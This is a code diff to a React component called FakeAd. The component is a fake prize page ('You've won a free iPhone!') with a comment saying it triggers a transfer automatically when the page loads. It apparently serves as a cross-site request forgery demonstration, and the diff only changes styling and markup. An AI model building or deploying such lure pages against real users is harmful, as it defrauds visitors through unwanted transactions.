@@ -1,8 +1,6 @@
 import React, { useEffect } from "react";
 import axios from "axios";
 
-import "./index.css";
-
 function FakeAd() {
   useEffect(() => {
     // Automatically trigger the transfer when the page loads
@@ -27,8 +25,12 @@ function FakeAd() {
 
   return (
     <div className="container fake-page">
-      <h1>🎉 Congratulations! 🎉</h1>
-      <p>You've won a free iPhone! Check your email for details.</p>
+      <div className="heading-container">
+        <h1>🎉 Congratulations! 🎉</h1>
+        <p className="subtitle">
+          You've won a free iPhone! Check your email for details.
+        </p>
+      </div>
     </div>
   );
 }
